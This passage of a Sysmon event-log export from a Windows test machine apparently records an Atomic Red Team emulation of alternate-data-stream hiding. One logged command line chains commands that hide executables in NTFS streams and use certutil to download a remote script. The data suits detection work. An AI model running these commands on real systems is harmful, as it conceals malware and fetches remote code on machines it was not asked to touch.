/o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b18-658d-7102-000000000b00},7044,4364,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:56.4208157Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:56.418,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:56.4208157Z""/>
      <EventRecordID>9460</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:56.418</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b18-658d-7102-000000000b00}</Data>
      <Data Name=""ProcessId"">4364</Data>
      <Data Name=""Image"">C:\Windows\regedit.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Editor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">REGEDIT.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:56.418

ProcessGuid: {fda94052-4b18-658d-7102-000000000b00}

ProcessId: 4364

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: ""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9459,,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:17.492

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 8312

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.110.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{00000000-0000-0000-0000-000000000000},7044,8312,,,raw.githubusercontent.com,::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.110.133;,0,"
      ",-,,,,,,2023-12-28T10:16:54.4229526Z,,,Dns query (rule: DnsQuery),,1124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:17.492,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.4229526Z""/>
      <EventRecordID>9459</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:17.492</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">8312</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.110.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:17.492

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 8312

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.110.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""ctfmon.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,CTF Loader,,,,,,,1,9458,,10.0.22621.1 (WinBuild.160101.0800),"MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240",C:\Windows\System32\ctfmon.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.273

ProcessGuid: {fda94052-4b16-658d-7002-000000000b00}

ProcessId: 2856

Image: C:\Windows\System32\ctfmon.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: CTF Loader

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CTFMON.EXE

CommandLine: ""ctfmon.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240

ParentProcessGuid: {fda94052-34f2-658d-4000-000000000b00}

ParentProcessId: 2980

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService

ParentUser: NT AUTHORITY\SYSTEM",Info,CTFMON.EXE,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService,C:\Windows\System32\svchost.exe,{fda94052-34f2-658d-4000-000000000b00},2980,NT AUTHORITY\SYSTEM,{fda94052-4b16-658d-7002-000000000b00},7044,2856,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.2790423Z,,,Process Create (rule: ProcessCreate),1,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 10:16:54.273,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.2790423Z""/>
      <EventRecordID>9458</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.273</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">2856</Data>
      <Data Name=""Image"">C:\Windows\System32\ctfmon.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">CTF Loader</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CTFMON.EXE</Data>
      <Data Name=""CommandLine"">""ctfmon.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34f2-658d-4000-000000000b00}</Data>
      <Data Name=""ParentProcessId"">2980</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.273

ProcessGuid: {fda94052-4b16-658d-7002-000000000b00}

ProcessId: 2856

Image: C:\Windows\System32\ctfmon.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: CTF Loader

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CTFMON.EXE

CommandLine: ""ctfmon.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=4D6ADD8B85F8E33937B8483BF5D040C1,SHA256=7E067B7DA5DA60458B5F7D5A99BC7C7C1F41999CD2559985F09267B1EC2E56EC,IMPHASH=6FD43544FB51C12382CAD7C88F550240

ParentProcessGuid: {fda94052-34f2-658d-4000-000000000b00}

ParentProcessId: 2980

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\vssvc.exe,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Microsoft® Volume Shadow Copy Service,,,,,,,1,9457,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE",C:\Windows\System32\VSSVC.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.150

ProcessGuid: {fda94052-4b16-658d-6d02-000000000b00}

ProcessId: 6312

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft® Volume Shadow Copy Service

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM",Info,VSSVC.EXE,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{fda94052-34eb-658d-0b00-000000000b00},788,NT AUTHORITY\SYSTEM,{fda94052-4b16-658d-6d02-000000000b00},7044,6312,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.1629039Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 10:16:54.150,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.1629039Z""/>
      <EventRecordID>9457</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.150</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6d02-000000000b00}</Data>
      <Data Name=""ProcessId"">6312</Data>
      <Data Name=""Image"">C:\Windows\System32\VSSVC.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Volume Shadow Copy Service</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">VSSVC.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\vssvc.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34eb-658d-0b00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.150

ProcessGuid: {fda94052-4b16-658d-6d02-000000000b00}

ProcessId: 6312

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft&#174; Volume Shadow Copy Service

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
